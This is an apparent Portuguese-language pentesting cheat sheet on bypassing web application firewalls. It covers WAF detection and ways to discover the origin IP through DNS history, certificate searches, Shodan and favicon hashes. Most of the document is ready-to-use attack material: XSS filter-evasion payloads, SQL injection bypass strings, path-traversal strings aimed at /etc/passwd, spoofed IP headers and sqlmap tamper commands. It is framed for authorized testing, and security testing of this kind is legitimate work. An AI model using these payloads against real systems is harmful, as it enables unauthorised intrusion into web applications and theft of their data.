# 🛡️ Guia de referência de contorno de WAF

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Contorno de firewall de aplicações web
```

> **Notas de precisão:** WAF significa firewall de aplicações web; origin é o servidor de origem atrás de um proxy/CDN. Identificar um IP, um certificado ou um favicon é um indício, não prova de que se encontrou a mesma aplicação. O MD5 do favicon e o hash MurmurHash usado no outro exemplo não são equivalentes. Codificações e sequências antigas, incluindo UTF-8 não canónico, bytes nulos e divisão de palavras-chave, só funcionam em contextos específicos. Alterar cabeçalhos de IP declarado não altera o IP da ligação nem garante um contorno. Uma origem pode restringir ligações ou exigir autenticação mútua, como [Authenticated Origin Pulls](https://developers.cloudflare.com/ssl/origin-configuration/authenticated-origin-pull/). Os exemplos foram preservados, sem garantia de funcionamento nas versões atuais.

---

<a id="-what-is-waf-bypass"></a>
## 🎯 O que é o contorno de WAF

As técnicas de **contorno de WAF** permitem a quem realiza testes de intrusão ultrapassar firewalls de aplicações web e aceder ao servidor de origem ou fazer chegar payloads.

### WAF comuns
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

<a id="-waf-detection"></a>
## 🔍 Deteção de WAF

### wafw00f
```bash
# Detetar o WAF
wafw00f https://target.com

# Saída detalhada
wafw00f https://target.com -v

# Testar todos os WAF
wafw00f https://target.com -a
```

### Deteção manual
```bash
# Verificar os cabeçalhos da resposta
curl -I https://target.com

# Procurar:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

<a id="-origin-ip-discovery"></a>
## 🌐 Descoberta do IP de origem

### Histórico DNS
```bash
# Serviços a consultar:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### Pesquisa de certificados SSL
```bash
# Pesquisar certificados no Censys.io
# Procurar: target.com no certificado

# crt.sh — Certificate Transparency (transparência de certificados)
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan — Pesquisar pelo hash do certificado SSL
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Consulta: services.tls.certificates.leaf_data.subject.common_name: target.com
```

### Cabeçalhos de email
```bash
# Subscrever a newsletter/notificações
# Procurar o IP de origem nos cabeçalhos do email

# Procurar:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Subdomínios sem CDN
```bash
# Encontrar subdomínios
subfinder -d target.com -o subs.txt

# Verificar quais utilizam uma CDN
cat subs.txt | httpx -ip

# Procurar:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Hash do favicon
```bash
# Obter o hash do favicon
curl -s https://target.com/favicon.ico | md5sum

# Pesquisar no Shodan pelo hash do favicon
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Pesquisa no Shodan
shodan search "http.favicon.hash:HASH_VALUE"
```

### Contorno através de IPv6
```bash
# O WAF pode não abranger IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### Intervalos de IP da cloud
```bash
# Descarregar os intervalos de IP dos fornecedores cloud
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# Se o IP alvo não estiver nos intervalos cloud, pode ser um candidato a origem
```

---

<a id="-payload-encoding-bypass"></a>
## 🔓 Contorno através da codificação de payloads

### Codificação URL
```
# Codificação simples
<script> → %3Cscript%3E

# Dupla codificação
<script> → %253Cscript%253E

# Codificação mista
<script> → %3Cscr%69pt%3E
```

### Codificação Unicode
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Sequências de escape Unicode
<script> → \u003cscript\u003e

# Entidades HTML
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Alteração de maiúsculas/minúsculas
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Bytes nulos
```
# Injeção de byte nulo
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Comentários
```sql
# Comentários SQL
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Comentários embutidos
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Alternativas aos espaços em branco
```sql
# Tabulação, mudança de linha e retorno do carro
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Sinal de adição
UNION+SELECT
1'+OR+1=1--
```

---

<a id="-waf-specific-bypasses"></a>
## 🔥 Contornos específicos de WAF

### Contorno de filtros XSS
```html
# Exemplo habitual bloqueado
<script>alert(1)</script>

# Variações para contornar o filtro
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Sem parênteses
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Sem alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Contorno de filtros SQLi
```sql
# Contorno de filtros de UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Contorno através de comentários
-- → #
-- → --+
-- → --%00
-- → /**/

# Contorno através de operadores lógicos
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Comentários específicos de versão (MySQL)
/*!50000SELECT*/ → Executa apenas se MySQL >= 5.0
```

### Contorno de filtros de travessia de diretórios
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

<a id="-http-techniques"></a>
## 🛠️ Técnicas HTTP

### HTTP Parameter Pollution (poluição de parâmetros HTTP)
```http
# Parâmetros duplicados
?id=1&id=2
?id=1&ID=2

# Injeção de arrays
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### Alteração do método HTTP
```bash
# Alterar o método
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Cabeçalhos de substituição do método
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Manipulação de cabeçalhos
```http
# Cabeçalhos para falsificar o IP declarado
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Confusão de Content-Type
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Codificação em blocos (chunked)
```http
Transfer-Encoding: chunked

4
test
0
```

---

<a id="-tools"></a>
## 🛠️ Ferramentas

| Ferramenta | Finalidade |
|------|---------|
| **wafw00f** | Deteção de WAF |
| **CloudFlair** | Descoberta da origem de sites protegidos pela Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | Pesquisa do histórico DNS |
| **WhatWaf** | Deteção e contorno de WAF |
| **sqlmap --tamper** | Scripts de contorno de filtros SQLi |

### Scripts tamper do sqlmap
```bash
# Utilizar scripts tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Vários scripts tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

| Técnica | Caso de utilização |
|-----------|----------|
| Histórico DNS | Encontrar o IP de origem |
| Pesquisa SSL | Pesquisa de certificados no Censys/Shodan |
| Enumeração de subdomínios | Encontrar subdomínios sem CDN |
| Codificação | Contornar filtros |
| Variação de maiúsculas/minúsculas | Contornar regras simples |
| Comentários | Dividir palavras-chave |

---

<a id="-resources"></a>
## 📚 Recursos

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [Contorno de WAF na OWASP](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ Teste o contorno de WAF!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
